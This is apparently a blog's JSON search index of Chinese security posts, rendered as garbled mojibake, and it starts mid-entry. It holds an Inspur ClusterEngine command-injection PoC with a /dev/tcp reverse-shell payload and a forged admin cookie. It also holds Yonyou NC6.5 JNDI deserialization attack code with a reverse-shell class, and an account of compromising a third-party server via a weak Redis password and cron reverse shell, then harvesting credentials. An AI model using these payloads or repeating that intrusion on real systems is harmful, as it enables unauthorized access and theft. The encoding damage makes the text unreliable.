æ³•è¿‡æ»¤âœechoa-d-c.\\/|awk-F\"\"'{for(i=1;i&lt;=NF;i++){if($i~/[a-zA-Z0-9_]/){str=$i;str1=(str1str)}}printstr1}'adcå…¶ä¸­è¿›è¡Œç®—æ³•è¯†åˆ«çš„ä»£ç åªèƒ½åœ¨redhatç³»ç»Ÿè¿è¡Œï¼Œä¸­æ–‡ç¯å¢ƒä¸‹çš„redhatç³»ç»Ÿcryptæ¢æˆåŠ å¯†å³å¯ï¼šencrypt=$(passwd-Sroot|sed-rn's/.*(\\w+)crypt.*/\\1/p')encrypt=$(passwd-Sroot|sed-rn's/.*(\\w+)åŠ å¯†.*/\\1/p')âœdockerrun-dhjd48/redhatâœdockerexec-itc2739bba0d86/bin/bash##redhat6å›½å†…æ¢æºbash-4.1#cd/etc/yum.repos.d/&amp;&amp;mkdirtmp&amp;&amp;mv*.repotmpbash-4.1#wget-O/etc/yum.repos.d/CentOS-Base.repohttps://static.lty.fun/%E5%85%B6%E4%BB%96%E8%B5%84%E6%BA%90/SourcesList/Centos-6-Vault-Aliyun.repo##encryptè·å–è¿‡ç¨‹bash-4.1#uname-aLinuxc2739bba0d865.10.25-linuxkit#1SMPTueMar2309:27:39UTC2021x86_64x86_64x86_64GNU/Linuxbash-4.1#cat/etc/issueRedHatEnterpriseLinuxServerrelease6.3(Santiago)Kernel\\ronan\\mbash-4.1#passwd-Sroot|sed-rn's/.*(\\w+)åŠ å¯†.*/\\1/p'SHA512##ç”¨æˆ·è®¤è¯è¿‡ç¨‹bash-4.1#bashuser_auth.shrootzanghun123rootarootbarootb$6$s8LxZk5w$VUlASup50b9gmquJS6BT6YhDGHwTZThCRQeXRi12bHq8gAgxhSuqO5R7Jwm6p62lEyL4na16tG21gtBV1KaOV.encrypt:SHA512s8LxZk5wpasswd_shadow:$6$s8LxZk5w$VUlASup50b9gmquJS6BT6YhDGHwTZThCRQeXRi12bHq8gAgxhSuqO5R7Jwm6p62lEyL4na16tG21gtBV1KaOV.passwd_t:$6$s8LxZk5w$VUlASup50b9gmquJS6BT6YhDGHwTZThCRQeXRi12bHq8gAgxhSuqO5R7Jwm6p62lEyL4na16tG21gtBV1KaOV.true0x01ï¼šè¿œç¨‹ä»£ç æ‰§è¡Œç”¨æˆ·è®¤è¯çš„é€»è¾‘åŸºæœ¬å¦‚æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°åœ¨webåº”ç”¨å±‚é’ˆå¯¹ç”¨æˆ·çš„è®¤è¯å°±æ˜¯bashä»£ç è¿›è¡Œç”¨æˆ·å“ˆå¸Œå€¼æ¯”å¯¹çš„ç»“æœï¼Œæ˜¯ä»¥è¿™æ ·çš„å‚æ•°ä¼ å…¥ï¼šbashuser_auth.sh$username$passwdæ‰€ä»¥å°±å¯¼è‡´äº†RCEï¼ŒåŸç†ä¹Ÿååˆ†ç®€å•ï¼Œæˆ‘ä»¬åœ¨webå±‚çš„ä¼ å…¥$usernameå’Œ$passwdä¸¤ä¸ªå‚æ•°å¯æ§ï¼ŒLinuxç¯å¢ƒä¸‹å¯¹ä¼ å…¥å‚æ•°ä½¿ç”¨ç¬¦å·ï¼š$`()è¿›è¡Œå˜é‡æ›¿æ¢å³å¯ï¼šbash-4.1#cdtouch-test/bash-4.1#lsbash-4.1#pwd/tmp/touch-testbash-4.1#$(touchid)bash-4.1#lsidbash-4.1#$(id)bash:uid=0(root):commandnotfoundæ‰€ä»¥ä¼ å…¥å‚æ•°è¿›è¡ŒRCEå³å¯ï¼›pocä»£ç ï¼š#POCæµ‹è¯•(å‡ºç°root:x:0:0åˆ™å­˜åœ¨æ¼æ´)op=login&amp;username=peiqi`$(cat/etc/passwd)`{\"err\":\"/bin/sh:root:x:0:0:root:/root:/bin/bash:Nosuchfileordirectory\\n\",\"exitcode\":1,\"out\":\"theuserpeiqidoesnotexist\\nerror:1\\n\"}#åå¼¹shellop=login&amp;username=peiqi`$(bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F{IP}}%2F{PORT}%200%3E%261)`å‚è€ƒæµªæ½®ClusterEngineV4.0ä»»æ„å‘½ä»¤æ‰§è¡Œ0x02ï¼šCookieä¼ªé€ ç™»å½•com.inspur.tsce4.Management.login()-Management.getCookie()-Management.loginOut()publicclassManagement{privatevoidgetCookie(){Stringkey=this.request.getParameter(\"name\");JSONObjectresult=newJSONObject();Cookie[]cookies=this.request.getCookies();Cookiecookie=null;CookieuserCookie=null;CookieL_TIMES_cookie=null;if(cookies!=null){for(inti=0;i&lt;cookies.length;++i){if(cookies[i].getName().equals(key)){cookie=cookies[i];}elseif(cookies[i].getName().equals(\"username\")){userCookie=cookies[i];}elseif(cookies[i].getName().equals(\"L_TIMES\")){L_TIMES_cookie=cookies[i];}}}if(userCookie==null&amp;&amp;key.equals(\"username\")){userCookie=cookie;}if(clearUserList.containsKey(userCookie.getValue())&amp;&amp;userCookie!=null&amp;&amp;key.equals(\"vertifyUser\")){Longnow=(newDate()).getTime();LongaddTime=((Date)clearUserList.get(userCookie.getValue())).getTime();if(now-addTime&gt;43200000L){clearUserList.remove(userCookie.getValue());}elseif(addTime-Long.parseLong(L_TIMES_cookie.getValue())&gt;0L){CookiecookieAuth=newCookie(\"vertifyUser\",\"false\");cookieAuth.setMaxAge(43200);cookieAuth.setPath(\"/\");cookieAuth.setHttpOnly(true);this.response.addCookie(cookieAuth);cookie=null;}}try{if(cookie!=null){result.put(\"result\",\"true\");result.put(\"value\",cookie.getValue());}else{result.put(\"result\",\"false\");}JsonUtil.respnseJson(this.response,result.toString());}catch(JSONExceptionvar10){JsonUtil.respnseJson(this.response,this.nullResJson.toString());}}}åˆ†æå¾—ï¼šç”¨æˆ·è®¤è¯Cookieä¸å­˜åœ¨éšæœºæ€§ã€æ—¶æ•ˆæ€§ã€‚æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç›´æ¥ä¼ªé€ Cookieç™»å…¥å³å¯ï¼šlang=cn;username=root;userType=administrator;vertifyUser=trueç›´æ¥ä½¿ç”¨Cookieæ’ä»¶ModHeaderå¸¦å…¥Cookieï¼Œç›´æ¥ç™»å…¥ï¼šä»¥ä¸Šã€‚"
  },

  {
    "title"    : "é€šè¾¾OAåˆ©ç”¨ä»£ç åˆ†æ",
    "category" : "about",
    "tags"     : "",
    "url"      : "/about/ToDa-OA-VulnPoc-by-java-analysis/",
    "date"     : "May 19, 2021",
    "content"  : "é€šè¾¾OAåˆ©ç”¨ä»£ç åˆ†æmain()//Main.javapublicclassMain{publicstaticvoidmain(String[]args){newTDOAFrame();}}âŒ˜command+å·¦é”®å•å‡»TDOAFrameè·³è½¬//TDOAFrame.javaimportjavax.swing.*;importjava.awt.*;publicclassTDOAFrameextendsJFrame{}/*TDOAFrameç»§æ‰¿Jframeï¼Œç”»å‡ºGUIå¯¹åº”æŒ‰é’®ç­‰*JLabeljLabel=newJLabel(\"ç›®æ ‡åœ°å€:\");*JTextFieldfield_url=newJTextField(\"http://192.168.238.141\",45);*ç»§ç»­å¾€ä¸‹åˆå§‹åŒ–Jbutton*JButtonbutton=newJButton(\"è·å–Cookie\");*JButtonbutton2=newJButton(\"ä¸€é”®åˆ©ç”¨\");*ç»™button\"è·å–Cookie\"æŒ‰é’®ç»‘å®šäº‹ä»¶*ç»™Button2\"ä¸€é”®åˆ©ç”¨\"æŒ‰é’®ç»‘å®šäº‹ä»¶*/publicclassTDOAFrameextendsJFrame{publicTDOAFrame(Stringtitle){button.addActionListener(newGetCookieActionListener(field_url,field_cookie,textArea));button2.addActionListener(newGetShellActionListener(field_url,field_cookie,jcomboBox,textArea));}}åŒæ ·çš„ï¼Œæˆ‘ä»¬é€šè¿‡åˆå§‹åŒ–æŒ‰é’®ç›‘å¬å™¨ï¼Œä¼ å…¥å¯¹åº”æŒ‰é’®æ‰€å¯¹åº”çš„å‚æ•°ï¼Œå¦‚ï¼šGetCookieActionListener(field_url,field_cookie,textArea)&amp;GetShellActionListener(field_url,field_cookie,jcomboBox,textArea)å³ï¼šbuttonè·å–cookieè·å–ç”¨æˆ·è¾“å…¥çš„field_url,field_cookieè¾“å…¥åˆ°textAreaç´§æ¥ç€buttonåˆ©ç”¨æŒ‰é’®ç‚¹å‡»è§¦å‘è·å–field_url,field_cookie,jcomboBoxï¼Œå°†æœ€ç»ˆç»“æœè¾“å‡ºåˆ°textAreaï¼Œä½†æˆ‘ä»¬ä»å›¾å½¢ç•Œé¢æ¥çœ‹ï¼Œä¸¤ä¸ªæ–‡æœ¬åŸŸåº”è¯¥ä¸æ˜¯åŒä¸€ä¸ªåŸŸï¼Œå®é™…ä¸Šæˆ‘ä¹Ÿå¾ˆå¥‡æ€ªè¿™ä¸€ç‚¹ã€‚ç´§æ¥ç€ï¼Œç»§ç»­âŒ˜command+å·¦é”®å•å‡»GetCookieActionListenerè·³è½¬privateJTextFieldfield_url;//ç›®æ ‡åœ°å€privateJTextFieldfield_cookie;//Cookie//privateJComboBoxjcomboBox;GetShellActionListeneråˆ©ç”¨æ–¹å¼æ˜¾ç¤ºprivateTextAreatextArea;//å¤šè¡Œæ–‡æœ¬æ¡†,æ˜¾ç¤ºç¨‹åºè¿è¡ŒçŠ¶æ€GetCookieActionListeneræ˜¯å¯¹åº”æŒ‰é’®ç›‘å¬åŠŸèƒ½ï¼Œä¸å…¶ç›¸åŒçš„è¿˜æœ‰GetShellActionListenerï¼Œä¸»æ–¹æ³•åˆ†æå®Œæ¯•åï¼Œæ“ä½œé€»è¾‘å°±æ˜¯è¿™ä¸¤ä¸ªæŒ‰é’®çš„æ“ä½œé€»è¾‘ï¼Œå…·ä½“å·¥ä½œé€»è¾‘å¦‚ä¸‹ï¼šStep1è·‘å®Œåè·³è‡³Step2ï¼Œæœ€åStep3ï¼›ç¾åŒ–:D[Updatingâ€¦]BeautyEyeGUIç¾åŒ–http://www.52im.net/thread-26-1-1.htmlhttp://www.52im.net/extend/docs/api/beautyeyev3/index.html?overview-tree.htmlhttp://www.52im.net/extend/docs/api/beautyeyev3/serialized-form.html#org.jb2011.lnf.beautyeye.ch1_titlepane.BETitlePaneç¾åŒ–å‰ï¼šç¾åŒ–åï¼š"
  },

  {
    "title"    : "åŸºäºModbusåè®®ä¸KingViewå®ç°Openplcä»¿çœŸé€šè®¯",
    "category" : "",
    "tags"     : "æ¼æ´å¤ç°, ç¬”è®°",
    "url"      : "/blog/2021/Realization-of-Openplc-simulation-communication-based-on-Modbus-protocol-and-KingView/",
    "date"     : "May 7, 2021",
    "content"  : "#ä»¿çœŸé€šè®¯é¶åœºæ­å»ºåŸºäºModbusåè®®ä¸KingViewå®ç°Openplcä»¿çœŸé€šè®¯-é€šè®¯é¶åœºç½‘ç»œç¤ºæ„å›¾å¦‚ä¸‹#OpenPLConLinuxOpenPLCç¯å¢ƒæ­å»ºç‚¹å‡»ä»¥äº†è§£OpenPLC$mkdirICWR&amp;&amp;cdICWR$gitclonehttps://github.com/thiagoralves/OpenPLC_v3.git$cdOpenPLC_v3$./install.shlinuxÂ·Â·Â·Â·Â·Â·Â·Â·Â·CompilingforLinuxGeneratingobjectfiles...GeneratingglueVars...Compilingmainprogram...Compilationfinishedsuccessfully!è¿è¡Œï¼šnohup./start_openplc.sh&amp;OpenPLC_EditoronLinuxä½œç”¨ä¸ºæœ¬åœ°PLCç¨‹åºè°ƒè¯•ä½¿ç”¨ï¼Œæ— éœ€æ±‚å¯è·³è¿‡$gitclonehttps://github.com/thiagoralves/OpenPLC_Editor.git$cdOpenPLC_Editor$./install.sh$./openplc_editor.sh#OpenPLCPrograms$curl-oopenplc_test.sthttps://raw.githubusercontent.com/sxd0216/openplc_test.st/master/openplc_test.st#KingviewonWindowsè®¾å¤‡é©±åŠ¨-&gt;PLC-&gt;è«è¿ªåº·-&gt;ModBUSTCP-&gt;TCP-&gt;ä¸‹ä¸€æ­¥ï¼šæ–‡ä»¶-&gt;ç”»é¢æ·»åŠ ç»„ä»¶ï¼ˆå¯å‚è€ƒåŠ¨å›¾æ·»åŠ ç»„ä»¶ï¼‰æ•°æ®åº“-&gt;æ•°æ®å­—å…¸-&gt;æ–°å»ºâ€¦é€‰ä¸­è‡ªå®šä¹‰ç”»é¢-&gt;make-&gt;viewï¼ˆGIFåŠ¨ç”»æœ‰ç‚¹å¤§ï¼Œloadingâ€¦ï¼‰ï¼š#é¶åœºæ”»å‡»æµé‡åˆ†æ#WireSharkæµé‡åˆ†æç½‘ä¸Šå·²ç»æœ‰å¤§ä½¬ä¸Šä¼ wiresharkæµé‡æ–‡ä»¶ï¼Œå°±ä¸é‡å¤é€ è½®å­å»æµé‡äº†ï¼Œç›´æ¥ä¸‹è½½ä¸‹æ¥å¯¹ç…§pocä»£ç åˆ†æçœ‹çœ‹ï¼šç‚¹å‡»ä¸‹è½½ï¼šsxd0216/attack-packets14ã€16å¸§ä¸ºclientå‘serverè¯·æ±‚æµé‡ï¼Œå…·ä½“å¦‚ä¸‹å›¾ï¼š15ã€17å¸§ä¸ºserverè¿”å›ç»™clientç¡®è®¤æµé‡ï¼Œå…·ä½“æµé‡å¯è‡ªè¡Œä¸‹è½½åˆ†æ#æ¨¡æ‹Ÿæ”»å‡»å¯åœ"
  },

  {
    "title"    : "ç”¨å‹NC6.5javaååºåˆ—åŒ–",
    "category" : "",
    "tags"     : "ååºåˆ—åŒ–",
    "url"      : "/blog/2021/yonyou-nc6.5-java-underser/",
    "date"     : "Mar 13, 2021",
    "content"  : "é›¶ï¼šç”¨å‹nc6.5ååºåˆ—åŒ–ä¾èµ–jaråŒ…0x01ï¼šæ”»å‡»javaä»£ç importnc.bs.framework.common.NCLocator;importjava.util.Properties;publicclasspoc{publicstaticvoidattack(Stringurl,Stringjndipath){Propertiesenv=newProperties();if(!url.startsWith(\"http\")){url=\"http://\"+url;}env.put(\"SERVICEDISPATCH_URL\",url+\"/ServiceDispatcherServlet\");NCLocatorlocator=NCLocator.getInstance(env);locator.lookup(jndipath);}publicstaticvoidmain(String[]args){attack(\"http://192.168.1.1:81\",\"ldap://192.168.1.2:1099/remote\");}}è¿è¡Œèµ·æ¥ä¸»è¦æŠ¥classNotFoundï¼Œå¿…éœ€ç¬¬ä¸‰æ–¹jaråŒ…å¦‚ä¸‹ï¼šncdepend.jarlog4j-1.2.15.jarlog.jaréƒ¨åˆ†ä¾èµ–jaråŒ…åœ¨å®‰è£…å®Œnc6.5ç³»ç»Ÿåï¼Œä¸€èˆ¬åœ¨C://yonyou//home//lib//ç›®å½•ä¸‹ï¼Œå‰æéœ€è¦æœ‰nc6.5çš„å®‰è£…åŒ…ï¼›æˆ–è€…ä¸‹è½½ä»“åº“å†…çš„ä¾èµ–åŒ…ï¼šç‚¹å‡»ä»¥äº†è§£yonyou-nc6.5-libæœ¬æœºè¿è¡Œç¯å¢ƒjavaversion\"1.8.0_181\"Java(TM)SERuntimeEnvironment(build1.8.0_181-b13)JavaHotSpot(TM)64-BitServerVM(build25.181-b13,mixedmode)javac1.8.0_181å­¦ä¹ æ•™ç¨‹READMEä¸‹è½½å•jaråŒ…ï¼šç‚¹å‡»ncdepend.jaré“¾æ¥-&gt;Download.æ•´åŒ…yonyou-NCv6.5-lib.zipé“¾æ¥-&gt;å•å‡»é“¾æ¥ä¸‹è½½[anonymous]DEBUG-Invokenc.bs.framework.server.RemoteMetaContext.lookupwriteinfotoserverspendtime:188Exceptioninthread\"main\"nc.bs.framework.exception.FrameworkIOException:Remoterequesterror0x02ï¼šè¿œç¨‹åˆ©ç”¨javaæ¶æ„ä»£ç importjavax.naming.Context;importjavax.naming.Name;importjavax.naming.spi.ObjectFactory;importjava.io.Serializable;importjava.util.Hashtable;publicclassremoteimplementsObjectFactory,Serializable{publicremote(){try{java.lang.Runtime.getRuntime().exec(newString[]{\"/bin/sh\",\"-c\",\"sh-i&gt;&amp;/dev/tcp/ip/port0&gt;&amp;1\"});}catch(Exceptione){e.printStackTrace();}}@OverridepublicObjectgetObjectInstance(Objectobj,Namename,ContextnameCtx,Hashtable&lt;?,?&gt;environment)throwsException{returnnull;}}0x03ï¼šä½¿ç”¨æ–¹æ³•JetbrainsIDEAï¼šfile-&gt;New-&gt;Project-&gt;Javaç‚¹å‡»ä»¥äº†è§£IDEAè¿è¡ŒJAVAé¡¹ç›®DEMOsrcç›®å½•-&gt;New-&gt;JavaClass-&gt;poc.javaå³å¯ï¼›ProjectStructure-&gt;Librabries-&gt;+æ·»åŠ libæ–‡ä»¶å¤¹å³å¯ï¼›æ¶æ„LDAPï¼šjava-cpmarshalsec-0.0.3-SNAPSHOT-all.jarmarshalsec.jndi.LDAPRefServer\"http://192.168.1.2:8000/#remote\"1099ç‚¹å‡»ä»¥äº†è§£marshalsecHTTPSERVER(remote.class)ï¼špython3-mhttp.serverå¡«å…¥ä¸»æ–¹æ³•ä¸‹attckurl&amp;jndipath-&gt;runpoc.main()å³å¯ã€‚enjoy.0x04ï¼šå‚è€ƒé“¾æ¥ç”¨å‹NCååºåˆ—åŒ–ç®€å•åˆ†æç”¨å‹nc6.5è¯¦ç»†å®‰è£…è¿‡ç¨‹"
  },

  {
    "title"    : "CST 2021å¹´ 4æœˆ14æ—¥ æ˜ŸæœŸä¸‰ï¼šä¸€æ¬¡æœ”æºäº‹ä»¶çš„è®°å½•",
    "category" : "",
    "tags"     : "ä¸»åŠ¨é˜²å¾¡, ä¿¡æ¯æœé›†",
    "url"      : "/blog/2021/Record-a-suffocating-emergency-response-and-traceability-incident/",
    "date"     : "Mar 13, 2021",
    "content"  : "ã€ŠBin4xinï¼šæˆ‘çš„ç½‘å®‰ä»ä¸šæœ”æºäº‹ä»¶è®°å½•ã€‹é›¶ï¼šèµ·æºä¸€æ—¥ï¼ŒæŸæŠ¤ç½‘çº¢é˜Ÿæ”¯æ’‘ç¾¤é‡Œå‘äº†ä¸€ä»½æœ”æºæŠ¥å‘Šï¼Œé¸¦é›€æ— å£°ç”²æ–¹ï¼šå°ä¼™ä¼´ä»¬æ¥é›†å›¢è¦æ±‚éœ€å¯¹WAFå…¨æµé‡å¹³å°æ”»å‡»ipè¿›è¡Œæœ”æºâ€¦åºŸä½¬ï¼šè¿™â€¦ï¼ˆç”²æ–¹ä½ çœŸå¯çˆ±ï¼‰é¢†å¯¼1ï¼šæº¯æºåˆ°æ”»å‡»ç«¯ä¿¡æ¯æ˜¯ä¸ªæ–°çš„é¢†åŸŸï¼Œæœ›å°ä¼™ä¼´ä»¬é€šè¿‡æ­¤æ¬¡é›†å›¢å®‰æ’åšäº›å°è¯•æ€§å­¦ä¹ å’Œæ¢ç´¢ï¼Œè½å®å¤–éƒ¨å¯å€ŸåŠ›å·¥å…·å’Œèµ„æºï¼Œ[@Bin4xinåºŸä½¬]ä¹ŸåŠ å…¥æ­¤æ¬¡æ¢ç´¢å­¦ä¹ ä¸­ã€‚åºŸä½¬ï¼šè¿™â€¦ï¼ˆé¢†å¯¼ä½ çœŸå¯çˆ±ï¼‰é¢†å¯¼2ï¼šæ–‡ä»¶ï¼šã€Šå…¨æµé‡ã€WAF4æœˆ8æ—¥-4æœˆ12æ—¥æ”»å‡»IP(1).xlsxã€‹$moreå…¨æµé‡ã€WAF4æœˆ8æ—¥-4æœˆ12æ—¥æ”»å‡»IP\\(1\\).csv223.214.211.4636.59.38.115$moreå…¨æµé‡ã€WAF4æœˆ8æ—¥-4æœˆ12æ—¥æ”»å‡»IP\\(1\\).csv|wc-l16570åºŸä½¬ï¼šè¿™â€¦ï¼ˆé¢†å¯¼ä½ çœŸå¯çˆ±ï¼‰äºæ˜¯åºŸä½¬å°±å¼€å§‹äº†æ„‰å¿«boringçš„æœ”æºä¹‹æ—…ä¸€ï¼šä¸Šåˆã€æ¬¢ä¹æ—¶å…‰&amp;fofaå®‰å…¨å·¥ç¨‹å¸ˆé²è¿…ï¼šä¸ä¼šæœ”æºçš„fofaå®‰å…¨å·¥ç¨‹å¸ˆä¸æ˜¯ä¸€ä¸ªå¥½çš„ä¿¡æ¯å®‰å…¨å·¥ç¨‹å¸ˆ#1x01ï¼šawkã€split&amp;linuxæ­¥å…¥ä¸»é¢˜ä¹‹å‰ï¼Œå…ˆå¯¹è¿™äº›æ–‡ä»¶è¿›è¡Œä¸€äº›ç®€å•çš„æ“ä½œï¼š$split-l300å…¨æµé‡ã€WAF4æœˆ8æ—¥-4æœˆ12æ—¥æ”»å‡»IP\\(1\\).csvips_preview_by300_$catips_preview_by300_aa|wc-l300$lltotal1400drwxr-xr-x59bin4xinstaff188841420:48./drwxr-xr-x+43bin4xinstaff137641420:45../-rw-r--r--1bin4xinstaff454841420:48ips_preview_by300_aa-rw-r--r--1bin4xinstaff445741420:48ips_preview_by300_ab-rw-r--r--1bin4xinstaff448141420:48ips_preview_by300_acÂ·Â·Â·è¿™æ ·æˆ‘ä»¬å°±æœ‰äº†è‹¥å¹²ä¸ª300è¡Œipçš„å°æ–‡ä»¶ï¼Œæ›´æ–¹ä¾¿æˆ‘ä»¬ç­›é€‰æˆ‘ä»¬éœ€è¦çš„ipï¼ŒNEXTã€‚justfofaï¼š#1x02ï¼šSomethingInterestingç‚¹å‡»ä»¥äº†è§£fofaå®‰å…¨å·¥ç¨‹å¸ˆä»¬ä¸å¾®æ­¥å®‰å…¨å·¥ç¨‹å¸ˆä»¬æ¬¢ä¹è€ŒåˆçŸ­æš‚çš„ä¸Šåˆå¦‚ç™½é©¹è¿‡éš™ï¼Œä¸€æ™ƒè€Œè¿‡ã€‚äºŒï¼šä¸‹åˆã€æ¯ç‡¥æ—¶å…‰&amp;æ¸—é€æµ‹è¯•å·¥ç¨‹å¸ˆ#2x01ï¼šnmapã€nc&amp;linuxshellç»ˆäºï¼šå‘ç°äº†ä¸€äº›æœ‰è¶£çš„ï¼šPORTSTATESERVICEVERSION22/tcpopensshOpenSSH6.6.1(protocol2.0)|ssh-hostkey:|2048fe:03:b9:0b:7b:ab:3f:bf:cd:60:93:57:52:4e:a6:c5(RSA)|2569d:97:b5:fb:db:92:ed:a7:e3:dd:f9:5f:86:b5:e3:b4(ECDSA)|_2567b:65:cf:48:84:15:82:ca:be:46:3c:cf:93:63:07:f1(ED25519)80/tcpopenhttpnginx|http-ls:Volume/|SIZETIMEFILENAME|-24-Feb-202113:21admin/|-24-Feb-202109:27redis/|-24-Aug-201704:55staragent/|-24-Feb-202108:44www/|-24-Feb-202108:44www/htdocs/|-13-Apr-202119:44www/logs/|_|http-methods:|_SupportedMethods:GETHEADPOST|_http-title:Indexof/888/tcpopenhttpnginx|http-methods:|_SupportedMethods:GETHEADPOST|_http-title:404NotFound3306/tcpopenmysqlMySQL5.5.62-log6379/tcpopenredisRediskey-valuestore8080/tcpopenhttpApacheTomcat8.5.63|_http-favicon:ApacheTomcat|http-methods:|_SupportedMethods:GETHEADPOST|_http-title:ApacheTomcat/8.5.638888/tcpopenhttpAjentihttpcontrolpaneläº‹å®ä¸Šï¼šè¿™æ˜¯ä¸€ä¸ªå®å¡”é¢æ¿ï¼Œ8888+888ç«¯å£ï¼›å¦ä¸€ä¸ªäº‹å®æ˜¯ï¼šè¿™ä¸ªè¢«WAFæŠ¥æˆ4æœˆ8æ—¥-4æœˆ12æ—¥æ”»å‡»IPçš„IPï¼Œmysql&amp;rediså‡ä¸ºå¼±å£ä»¤ã€‚ç‚¹å‡»æ›´å¤šä»¥äº†è§£redisæ¸—é€$./redis-cli-hredis_target_ipredis_target_ip:6379&gt;getkey(error)NOAUTHAuthenticationrequired.redis_target_ip:6379&gt;redis_target_ip:6379&gt;auth123456OKredis_target_ip:6379&gt;getkey(nil)redis_target_ip:6379&gt;setxx\"\\n*****bash-i&gt;&amp;/dev/tcp/your_vps_target/port0&gt;&amp;1\\n\"OKredis_target_ip:6379&gt;configsetdir/var/spool/cron/OKredis_target_ip:6379&gt;configsetdbfilenamerootOKredis_target_ip:6379&gt;saveOKredis_target_ip:6379&gt;quit#2x02ï¼šbashã€Informationgathering&amp;Traceabilityincidentäºæ˜¯æˆ‘ä»¬é€šè¿‡ä¸Šé¢æ­¥éª¤è·å¾—äº†æœåŠ¡å™¨æƒé™ï¼›awesome?nextmoreawesome.é€šè¿‡åœ¨æœåŠ¡å™¨çš„ä¿¡æ¯æœé›†ï¼Œä¼¼ä¹çœ‹åˆ°äº†19å¹´åˆšåˆšæ¥è§¦æœåŠ¡å™¨çš„è‡ªå·±ï¼Œæ²¡æœ‰ä»»ä½•å˜²è®½çš„æ„æ€ï¼Œæ‰€æœ‰äººéƒ½æ˜¯åˆå­¦è€…è¿‡æ¥çš„ï¼›NOOFFENCE:-)Thanksæ›´åŠ äº†è§£linuxå’Œlinuxé¢æ¿ï¼Œå¦åˆ™å°±ä¼šæ˜¾å¾—ååˆ†ä¸šä½™ï¼Œä¸ç®¡ä½ æ˜¯Development,operationandmaintenanceorsecuritypractitionersï¼›åŒ®ä¹çš„linuxçŸ¥è¯†å¯¼è‡´çš„è¿‡å¤šsshè¿æ¥ï¼šps-ef|grepssh|wc-l50é”™ä¹±çš„ç»ˆç«¯ä¸æ•°æ®åº“å‘½ä»¤è¿è¡Œï¼š$cat/home/admin/.bash_historysudogrepwordpress_admin_passwd/root/env.txt/usr/local/mysql/bin/mysql-uroot-p123456sudosurooesudosurootsudogrepmysql_root_passwd/root/env.txtmysqlaliasmysql=/usr/local/mysql/bin/mysqlmysqlfind/-namemysql.socksudogrepmysql_root_passwd/root/env.txtmsyqlsudosurootgrantallprivilegeson*.*to'root'@'%'identifiedby'pass-hidden';grantallprivilegeson*.*to'root'@'%'identifiedby'123456';é”™è¯¯çš„linuxæƒé™åˆ†é…ï¼š$ps-ef|greprootroot796310Mar06?00:39:39/usr/bin/java-Djava.util.logging.config.file=/www/server/apache-tomcat-8.5.63/conf/logging.properties-Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager-Djdk.tls.ephemeralDHKeySize=2048-Djava.protocol.handler.pkgs=org.apache.catalina.webresources-Dorg.apache.catalina.security.SecurityListener.UMASK=0027-Dignore.endorsed.dirs=-classpath/www/server/apache-tomcat-8.5.63/bin/bootstrap.jar:/www/server/apache-tomcat-8.5.63/bin/tomcat-juli.jar-Dcatalina.base=/www/server/apache-tomcat-8.5.63-Dcatalina.home=/www/server/apache-tomcat-8.5.63-Djava.io.tmpdir=/www/server/apache-tomcat-8.5.63/temporg.apache.catalina.startup.Bootstrapstartroot2301710Mar06?00:00:00nginx:masterprocessnginx-cconf/nginx.confroot2780310Feb25?01:17:18./redis-server*:6379Â·Â·Â·åŒæ ·çš„ï¼šé€šè¿‡historyæ‰¾åˆ°é¢æ¿ç®¡ç†å¯†ç ï¼›tools.pyformBTpanelï¼š$cat/root/.bash_history|greptoolscd/www/server/panel&amp;&amp;pythontools.pypanelpass-hidden$cat/www/server/panel/tools.pyif__name__==\"__main__\":type=sys.argv[1]iftype=='root':set_mysql_root(sys.argv[2])eliftype=='panel':set_panel_pwd(sys.argv[2])æ‰€ä»¥ï¼Œpanelæ¨¡å¼ä¸‹å¯¹åº”çš„æ˜¯é¢æ¿å¯†ç è®¾ç½®ï¼›è‡³æ­¤ï¼Œæˆ‘ä»¬è·å¾—äº†rootã€redisã€mysqlã€BTpanelï¼›è€Œæœ¬æ–‡å¹¶ç‚«æŠ€ï¼Œæˆ‘ä»¬çš„åˆè¡·æ˜¯æœ”æºï¼šmysqlï¼šæ•°æ®åº“ä»…ä»…æ˜¯å­˜æ”¾è®ºå›ç³»ç»Ÿç®¡ç†çš„ä¿¡æ¯åŠæµ‹è¯•ä¿¡æ¯ï¼›redisï¼šé…åˆmysqlï¼Œä¸å¿…å¤šè¯´ï¼›BTpanelï¼šwwwã€ftpã€sqlç­‰é…ç½®å‡ä¸ºç®€å•é…ç½®ï¼Œæ²¡æœ‰å‚è€ƒä»·å€¼ã€‚ä¸‰ï¼šæ€»ç»“1ã€æœ¬ç¯‡æ–‡ç« çš„å­˜åœ¨æ„ä¸ºä¿¡æ¯æœé›†ã€æœ”æºæ–¹å‘ä¸Šçš„æŠ›ç –å¼•ç‰ï¼Œæ–‡ç¬”ä¸ä½³ï¼›2ã€ç»“åˆ#2x01åŠ#2x02å°ç»“é€šç¯‡ç»“æŸå¹¶æœªå‘ç°æ”»å‡»è¿¹è±¡ã€ç—•è¿¹ï¼›3ã€ä¸ºä½•è¢«æŠ¥ä¸ºæ”»å‡»IPä¸å¾—è€ŒçŸ¥ã€‚ä»¥ä¸Šã€‚"
  },

  {
    "title"    : "è¾›ä¸‘Â·æœ¬å‘½å¹´ å¹´åçš„ä¸€äº›æ€è€ƒ",
    "category" : "",
    "tags"     : "ç¬”è®°",
    "url"      : "/blog/2021/thereis-something2say/",
    "date"     : "Mar 13, 2021",
